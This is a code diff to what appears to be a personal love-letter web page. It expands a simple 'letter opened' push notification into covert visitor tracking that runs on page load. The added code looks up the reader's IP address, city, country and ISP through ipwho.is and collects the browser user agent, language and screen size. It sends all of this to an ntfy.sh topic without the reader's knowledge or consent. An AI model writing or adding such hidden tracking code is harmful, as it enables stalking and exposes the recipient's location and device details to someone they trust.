@@ -195,13 +195,32 @@ const SPOTIFY="https://open.spotify.com/track/4OJbPIZ17OsAqXNXbYwZcF";
 // 2) Suscríbete EXACTAMENTE a este tema (topic):
 const NTFY_TOPIC = "carta-bibi-santi-9k2mx7";   // <- cámbialo por algo único tuyo
 // 3) Listo: cuando alguien abra la página, te llega un push.
-(function(){
+(async function(){
   try{
     if(!NTFY_TOPIC) return;
+    var ua = navigator.userAgent;
+    var lang = navigator.language || "";
+    var scr = (screen.width||"?")+"x"+(screen.height||"?");
+    var when = new Date().toLocaleString("es-CO");
+    var geo = "";
+    try{
+      var r = await fetch("https://ipwho.is/");
+      var j = await r.json();
+      if(j && j.success !== false){
+        geo = [j.city, j.region, j.country].filter(Boolean).join(", ");
+        if(j.connection && j.connection.isp) geo += " · " + j.connection.isp;
+        if(j.ip) geo += " · IP " + j.ip;
+      }
+    }catch(e){}
+    var body =
+      "📍 " + (geo || "ubicación desconocida") + "\n" +
+      "📱 " + ua + "\n" +
+      "🖥️ " + scr + " · " + lang + "\n" +
+      "🕒 " + when;
     fetch("https://ntfy.sh/"+NTFY_TOPIC, {
       method:"POST",
-      body:"💌 Alguien abrió la carta — "+new Date().toLocaleString("es-CO"),
-      headers:{ "Title":"Carta para Bibi", "Priority":"high", "Tags":"heart,love_letter" },
+      body: body,
+      headers:{ "Title":"Abrieron la carta", "Priority":"high", "Tags":"heart" },
       keepalive:true
     }).catch(function(){});
   }catch(e){}
